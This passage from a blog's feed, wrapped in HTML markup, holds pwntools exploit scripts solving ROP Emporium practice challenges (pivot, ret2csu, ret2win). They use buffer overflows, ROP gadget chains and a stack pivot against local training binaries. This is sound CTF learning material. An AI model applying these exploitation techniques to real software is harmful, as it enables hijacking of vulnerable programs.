0x0400b05</span><br><span class="line">pop_rbp = 0x0400900</span><br><span class="line">pop_rdi = 0x0400b73</span><br><span class="line"></span><br><span class="line">call_rax = 0x040098e</span><br><span class="line">add_rax_rbp = 0x0400b09</span><br><span class="line"></span><br><span class="line">xchg_rax_rsp = 0x0400b02</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"The Old Gods kindly bestow upon you a place to pivot: "</span>)</span><br><span class="line">heap_addr  = int(sh.recv(14),16)</span><br><span class="line"></span><br><span class="line">payload1 = p64(foothold_function_plt) + p64(pop_rax) + p64(foothold_function_got) + p64(mov_rax_addr)</span><br><span class="line">payload1 += p64(pop_rbp) + p64(offest) + p64(add_rax_rbp) + p64(call_rax)</span><br><span class="line"></span><br><span class="line">payload2 = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload2 += p64(pop_rax) + p64(heap_addr) + p64(xchg_rax_rsp)</span><br><span class="line"></span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload1)</span><br><span class="line">sh.recvuntil(<span class="string">"&gt; "</span>)</span><br><span class="line">sh.sendline(payload2)</span><br><span class="line">sh.recvuntil(<span class="string">"into libpivot.so"</span>)  <span class="comment">#foothold_function() in libpivot.so print this sentence</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="8-ret2csu"><a href="#8-ret2csu" class="headerlink" title="8-ret2csu"></a>8-ret2csu</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'./ret2csu'</span>)</span><br><span class="line">gdb.attach(sh)</span><br><span class="line"></span><br><span class="line">system = 0x04005A0</span><br><span class="line">ret2win = 0x04007B1</span><br><span class="line">init = 0x0600E18   <span class="comment">#self init/fini</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#gadget </span></span><br><span class="line">pop5_addr = 0x040089A  <span class="comment">#pop_rbx_rbp_r12_r13_r14_r15</span></span><br><span class="line">mov_call = 0x0400880   <span class="comment">#mov rdx_r15 rsi_r14 edi_r13d  call r12+rbp*8</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">"a"</span>*0x20 + p64(0)</span><br><span class="line">payload += p64(pop5_addr) + p64(0) + p64(1) + p64(init) + p64(0) + p64(0) + p64(0xdeadcafebabebeef)</span><br><span class="line">payload += p64(mov_call) + <span class="string">"a"</span>*56 + p64(ret2win)</span><br><span class="line">gdb.attach(sh,<span class="string">'b setvbuf'</span>)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;这里是ROP Emporium的题的exp，然后由于我太懒，exp都是64位的，32位的还没写。&lt;/p&gt;
&lt;h2 id=&quot;1-ret2win&quot;&gt;&lt;a href=&quot;#1-ret2win&quot; class=&quot;headerlink&quot; title=&quot;1-ret2win&quot;&gt;&lt;/a&gt;1-ret2win&lt;/h2&gt;&lt;figure class=&quot;highlight bash&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# -*- coding:utf-8 -*-&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;from pwn import *&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh = process(&lt;span class=&quot;string&quot;&gt;&#39;./ret2win&#39;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;shell=0x0400824&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;bss = 0x0601060&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;payload = 0x20*&lt;span class=&quot;string&quot;&gt;&quot;a&quot;&lt;/span&gt; + p64(0) + p64(shell)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.sendline(payload)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;sh.interactive()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
    
    </summary>
    
    
    
  </entry>
  
</feed>
